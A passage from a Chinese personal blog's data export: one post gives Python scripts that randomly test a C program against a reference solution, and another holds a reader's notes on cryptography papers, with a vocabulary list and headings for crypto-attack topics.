id=\"Windows下\"><a href=\"#Windows下\" class=\"headerlink\" title=\"Windows下\"></a>Windows下</h3><p>鉴于本人是追求实用（能跑就行），同理猜测读者也不关心这到底怎么实现，或者说不着急关心，于是直接附上 Windows 环境下的 Python 源码，开盒即用，只需要你有一点 Python 的基础，会装 subprocess 和 tqdm 库就行，然后在脚本所在的目录新建一个名为<code>标准代码</code>的文件夹，并在里面放入一个<code>std.c</code>作为测试输出的基准参照，同理新建一个<code>测试代码</code>的文件夹并放入<code>test.c</code>作为被测试的代码，<strong>同时安装好gcc</strong>，运行脚本，就能大功告成了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">random_int_list</span>(<span class=\"params\">start, stop, length</span>):</span><br><span class=\"line\">    start, stop = (<span class=\"built_in\">int</span>(start), <span class=\"built_in\">int</span>(stop)) <span class=\"keyword\">if</span> start &lt;= stop <span class=\"keyword\">else</span> (</span><br><span class=\"line\">        <span class=\"built_in\">int</span>(stop), <span class=\"built_in\">int</span>(start))</span><br><span class=\"line\">    length = <span class=\"built_in\">int</span>(<span class=\"built_in\">abs</span>(length)) <span class=\"keyword\">if</span> length <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    random_list = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(length):</span><br><span class=\"line\">        random_list.append(random.randint(start, stop))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> random_list</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">iotest</span>(<span class=\"params\">filename, path, data</span>):</span><br><span class=\"line\">    obj = subprocess.Popen([filename], stdin=subprocess.PIPE,</span><br><span class=\"line\">                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=path, encoding=<span class=\"string\">&quot;utf-8&quot;</span>,shell=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    obj.stdin.write(data)</span><br><span class=\"line\">    out_info, out_error = obj.communicate()  <span class=\"comment\"># 简单写法，out_info：标准输出</span></span><br><span class=\"line\">    <span class=\"comment\"># print(out_info,out_error)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> out_info</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    stdpath = <span class=\"string\">&quot;%s\\\\标准代码\\\\&quot;</span> % sys.path[<span class=\"number\">0</span>]      <span class=\"comment\"># 标准代码所在路径</span></span><br><span class=\"line\">    testpath = <span class=\"string\">&quot;%s\\\\测试代码\\\\&quot;</span> % sys.path[<span class=\"number\">0</span>]     <span class=\"comment\"># 测试代码所有路径</span></span><br><span class=\"line\">    <span class=\"comment\">#编译标准及测试代码</span></span><br><span class=\"line\">    result = subprocess.check_output(<span class=\"string\">&quot;gcc -std=c99 -o std std.c&quot;</span>, shell=<span class=\"literal\">True</span>, cwd=stdpath)</span><br><span class=\"line\">    result = subprocess.check_output(<span class=\"string\">&quot;gcc -std=c99 -o test test.c&quot;</span>, shell=<span class=\"literal\">True</span>, cwd=testpath)</span><br><span class=\"line\"></span><br><span class=\"line\">    f = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;%s\\测试结果.txt&#x27;</span> % sys.path[<span class=\"number\">0</span>], <span class=\"string\">&#x27;w+&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>, newline=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;随机测试中...&#x27;</span>)</span><br><span class=\"line\">    pas=<span class=\"number\">0</span>       <span class=\"comment\"># 通过次数</span></span><br><span class=\"line\">    freq=<span class=\"number\">10</span>    <span class=\"comment\"># 测试次数</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> index <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(freq)):</span><br><span class=\"line\">        <span class=\"comment\"># 生成测试数据</span></span><br><span class=\"line\">        rtest = random_int_list(<span class=\"number\">0</span>, <span class=\"number\">99</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">        s = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> rtest:</span><br><span class=\"line\">            s = <span class=\"string\">&quot;%s%s &quot;</span> % (s, i)</span><br><span class=\"line\">        s = <span class=\"string\">&quot;%s\\n&quot;</span> % s</span><br><span class=\"line\">        <span class=\"comment\"># 进行测试</span></span><br><span class=\"line\">        output = iotest(<span class=\"string\">&quot;.\\\\test.exe&quot;</span>, testpath, s)</span><br><span class=\"line\">        stdoutput = iotest(<span class=\"string\">&quot;.\\\\std.exe&quot;</span>, stdpath, s)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;随机测试 - r,%d数据点\\n&quot;</span>%index)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;标准输入\\n%s&quot;</span> % s)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;实际输出\\n%s\\n&quot;</span> % output)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;期望输出\\n%s\\n\\n&quot;</span> % stdoutput)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> output==stdoutput:</span><br><span class=\"line\">            f.write(<span class=\"string\">&#x27;通过「随机测试 - r,%d数据点」测试点\\n\\n&#x27;</span>%index)</span><br><span class=\"line\">            pas=pas+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            f.write(<span class=\"string\">&#x27;未通过「随机测试 - r,%d数据点」测试点\\n\\n&#x27;</span>%index)</span><br><span class=\"line\">    f.close()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;随机测试 %d/%d&#x27;</span>%(pas,freq))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;测试完成&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>同时附上样例标准代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> N 10</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">inputarray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">handlearray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">outputarray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">swap</span><span class=\"params\">(<span class=\"type\">int</span> *p,<span class=\"type\">int</span> *q)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"built_in\">array</span>[N]= &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    inputarray(<span class=\"built_in\">array</span>);</span><br><span class=\"line\">    handlearray(<span class=\"built_in\">array</span>);</span><br><span class=\"line\">    outputarray(<span class=\"built_in\">array</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">swap</span><span class=\"params\">(<span class=\"type\">int</span> *p,<span class=\"type\">int</span> *q)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> temp=*p;</span><br><span class=\"line\">    *p=*q;</span><br><span class=\"line\">    *q=temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">handlearray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> *p=arr;</span><br><span class=\"line\">    <span class=\"type\">int</span> max_index=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> min_index=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> max=arr[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> min=arr[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;N;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(*(p+i)&gt;max)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            max=*(p+i);</span><br><span class=\"line\">            max_index=i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(*(p+i)&lt;min)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            min=*(p+i);</span><br><span class=\"line\">            min_index=i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    swap((p+max_index),(p+<span class=\"number\">9</span>));</span><br><span class=\"line\">    swap((p+min_index),(p+<span class=\"number\">0</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">inputarray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> *p=arr;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;N; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,(p+i));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">outputarray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> *p=arr;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;N; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,*(p+i));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>以及样例测试代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> <span class=\"title function_\">inv</span><span class=\"params\">(<span class=\"type\">int</span> *x, <span class=\"type\">int</span> n)</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> i, a[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;\\n&quot;);</span></span><br><span class=\"line\">    inv(a, <span class=\"number\">10</span>);</span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;The array has been inverted:\\n&quot;);</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>, a[i]);</span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;\\n&quot;);</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">inv</span><span class=\"params\">(<span class=\"type\">int</span> *x, <span class=\"type\">int</span> n)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> *i, max, min, p, q, *c, *d;</span><br><span class=\"line\">    max = *x;</span><br><span class=\"line\">    min = *(x + <span class=\"number\">1</span>);</span><br><span class=\"line\">    c = x + <span class=\"number\">0</span>;</span><br><span class=\"line\">    d = x + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = x; i &lt; x + <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (*i &gt; max)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            max = *i;</span><br><span class=\"line\">            c = i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = x; i &lt; x + <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (*i &lt; min)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            min = *i;</span><br><span class=\"line\">            d = i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    p = *x;</span><br><span class=\"line\">    *x = *d;</span><br><span class=\"line\">    *d = p;</span><br><span class=\"line\">    q = *(x + <span class=\"number\">9</span>);</span><br><span class=\"line\">    *(x + <span class=\"number\">9</span>) = *c;</span><br><span class=\"line\">    *c = q;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Linux-下的-Python-源码\"><a href=\"#Linux-下的-Python-源码\" class=\"headerlink\" title=\"Linux 下的 Python 源码\"></a>Linux 下的 Python 源码</h3><p>一个现象就是， Linux 下进行测试的速度明显比 Windows 下快，我测试的时候两者甚至相差 100 余倍，其中原因可留给读者细究。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">random_int_list</span>(<span class=\"params\">start, stop, length</span>):</span><br><span class=\"line\">    start, stop = (<span class=\"built_in\">int</span>(start), <span class=\"built_in\">int</span>(stop)) <span class=\"keyword\">if</span> start &lt;= stop <span class=\"keyword\">else</span> (</span><br><span class=\"line\">        <span class=\"built_in\">int</span>(stop), <span class=\"built_in\">int</span>(start))</span><br><span class=\"line\">    length = <span class=\"built_in\">int</span>(<span class=\"built_in\">abs</span>(length)) <span class=\"keyword\">if</span> length <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    random_list = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(length):</span><br><span class=\"line\">        random_list.append(random.randint(start, stop))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> random_list</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">iotest</span>(<span class=\"params\">filename, path, data</span>):</span><br><span class=\"line\">    obj = subprocess.Popen([filename], stdin=subprocess.PIPE,</span><br><span class=\"line\">                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=path, encoding=<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">    obj.stdin.write(data)</span><br><span class=\"line\">    out_info, out_error = obj.communicate()  <span class=\"comment\"># 简单写法，out_info：标准输出</span></span><br><span class=\"line\">    <span class=\"comment\"># print(out_info,out_error)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> out_info</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    stdpath = <span class=\"string\">&quot;%s/标准代码/&quot;</span> % sys.path[<span class=\"number\">0</span>]      <span class=\"comment\"># 标准代码所在路径</span></span><br><span class=\"line\">    testpath = <span class=\"string\">&quot;%s/测试代码/&quot;</span> % sys.path[<span class=\"number\">0</span>]     <span class=\"comment\"># 测试代码所有路径</span></span><br><span class=\"line\">    <span class=\"comment\">#编译标准及测试代码</span></span><br><span class=\"line\">    result = subprocess.check_output(<span class=\"string\">&quot;gcc -std=c99 -o std std.c&quot;</span>, shell=<span class=\"literal\">True</span>, cwd=stdpath)</span><br><span class=\"line\">    result = subprocess.check_output(<span class=\"string\">&quot;gcc -std=c99 -o test test.c&quot;</span>, shell=<span class=\"literal\">True</span>, cwd=testpath)</span><br><span class=\"line\"></span><br><span class=\"line\">    f = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;%s/测试结果.txt&#x27;</span> % sys.path[<span class=\"number\">0</span>], <span class=\"string\">&#x27;w+&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>, newline=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;随机测试中...&#x27;</span>)</span><br><span class=\"line\">    pas=<span class=\"number\">0</span>       <span class=\"comment\"># 通过次数</span></span><br><span class=\"line\">    freq=<span class=\"number\">100</span>    <span class=\"comment\"># 测试次数</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> index <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(freq)):</span><br><span class=\"line\">        <span class=\"comment\"># 生成测试数据</span></span><br><span class=\"line\">        rtest = random_int_list(<span class=\"number\">0</span>, <span class=\"number\">99</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">        s = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> rtest:</span><br><span class=\"line\">            s = <span class=\"string\">&quot;%s%s &quot;</span> % (s, i)</span><br><span class=\"line\">        s = <span class=\"string\">&quot;%s\\n&quot;</span> % s</span><br><span class=\"line\">        <span class=\"comment\"># 进行测试</span></span><br><span class=\"line\">        output = iotest(<span class=\"string\">&quot;./test&quot;</span>, testpath, s)</span><br><span class=\"line\">        stdoutput = iotest(<span class=\"string\">&quot;./std&quot;</span>, stdpath, s)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;随机测试 - r,%d数据点\\n&quot;</span>%index)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;标准输入\\n%s&quot;</span> % s)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;实际输出\\n%s\\n&quot;</span> % output)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;期望输出\\n%s\\n\\n&quot;</span> % stdoutput)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> output==stdoutput:</span><br><span class=\"line\">            f.write(<span class=\"string\">&#x27;通过「随机测试 - r,%d数据点」测试点\\n\\n&#x27;</span>%index)</span><br><span class=\"line\">            pas=pas+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            f.write(<span class=\"string\">&#x27;未通过「随机测试 - r,%d数据点」测试点\\n\\n&#x27;</span>%index)</span><br><span class=\"line\">    f.close()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;随机测试 %d/%d&#x27;</span>%(pas,freq))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;测试完成&#x27;</span>)</span><br></pre></td></tr></table></figure>"},{"title":"密码学论文记","date":"2022-08-18T09:30:00.000Z","_content":"\n记录一下读的 Papers\n<!--more-->\n\n## 常见词汇\n\ndevise 发明\npermutation 置换\nreciprocal 倒数\ncardinality 基数\ncorollary 推论\ncanonica 规范的\nsymmetric 对称的\ndeterminant 行列式\nregarding 关于\nmap 映射\nprojection 投影\ncoordinate 坐标\ndenote 标示\nrational 有理的\nthus 因此\nalternatively 或者\noptimize 优化\nanew 重新\ntedious 乏味的\nnon-trivial 不平凡的\nderive 得到\nhence 因此\ncomposite number 合数\nor else 否则\nscenario 方案\nimplicit 隐式的\nanalogous 相似的\nasymptotical 渐进的\nsake 目的\nnotation 符号\n\n## 文章汇总\n\n### 1. Cryptanalysis of Unbalanced RSA with Small CRT-Exponent\n\n第一篇正经详细读的论文，作者 Alexander May 挺 nb 的，多元 coppersmith 也是他和另一个人写的，有机会也读一下。\n这篇 paper 主要讲 $p$ 和 $q$ 不平衡时的 RSA 攻击，还要满足 $d_p$ 足够小。具体如下：\n$$\n\\beta = q_{bits}/n_{bits}   \\\\\\\\\n\\delta = d_{p_{bits}}/n_{bits}  \\\\\\\\\ns.t. \\enspace 3\\beta < 1+\\beta^2+2\\delta\n$$\n\n### 2. Modulus Fault Attacks Against RSA-CRT Signatures\n\n### 3. Merkle-Hellman Revisited: A Cryptanalysis of the Qu-Vanstone Cryptosystem Based on Group Factorizations\n\n### 4. A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants\n\n## 攻击汇总\n\n之前在 GitHub 上看到的一个很全的攻击汇总，记录下。\n\n### Approximate Common Divisor\n\n### CBC\n\n### CBC + CBC-MAC\n\n### CTR\n\n### ECB\n\n### Elliptic Curve Cryptography\n\n### ElGamal Encryption\n\n### ElgGamal Signature\n\n### Factorization\n\n已知部分 p 和 q\n已知部分 p, q 和 d\n已知部分 p, q, d, dp 和 dq\n已知部分 p\n已知 phi\n孪生素数（这个稍微有点逊）\n$p > q^3$ 且已知部分 p\n\n### GCM\n\n### Hidden Number Problem\n\n### IGE\n\n### Knapsack Cryptosystems\n\n### Linear Congruential Generators\n\n### Learning With Errors\n\n### Mersenne Twister\n\n### One-time Pad\n\n### Pseudoprimes\n\n### RC4\n\n### RSA\n\n### Shamir's Secret Sharing\n","source":"_posts/密码学论文记.md","raw":"---\ntitle: 密码学论文记\ndate: 2022-08-18 17:30:00\ntags: [数学, 抽象代数, Crypto, 论文]\ncategories: 数学\n---\n\n记录一下读的 Papers\n<!--more-->\n\n## 常见词汇\n\ndevise 发明\npermutation 置换\nreciprocal 倒数\ncardinality 基数\ncorollary 推论\ncanonica 规范的\nsymmetric 对称的\ndeterminant 行列式\nregarding 关于\nmap 映射\nprojection 投影\ncoordinate 坐标\ndenote 标示\nrational 有理的\nthus 因此\nalternatively 或者\noptimize 优化\nanew 重新\ntedious 乏味的\nnon-trivial 不平凡的\nderive 得到\nhence 因此\ncomposite number 合数\nor else 否则\nscenario 方案\nimplicit 隐式的\nanalogous 相似的\nasymptotical 渐进的\nsake 目的\nnotation 符号\n\n## 文章汇总\n\n### 1. Cryptanalysis of Unbalanced RSA with Small CRT-Exponent\n\n第一篇正经详细读的论文，作者 Alexander May 挺 nb 的，多元 coppersmith 也是他和另一个人写的，有机会也读一下。\n这篇 paper 主要讲 $p$ 和 $q$ 不平衡时的 RSA 攻击，还要满足 $d_p$ 足够小。具体如下：\n$$\n\\beta = q_{bits}/n_{bits}   \\\\\\\\\n\\delta = 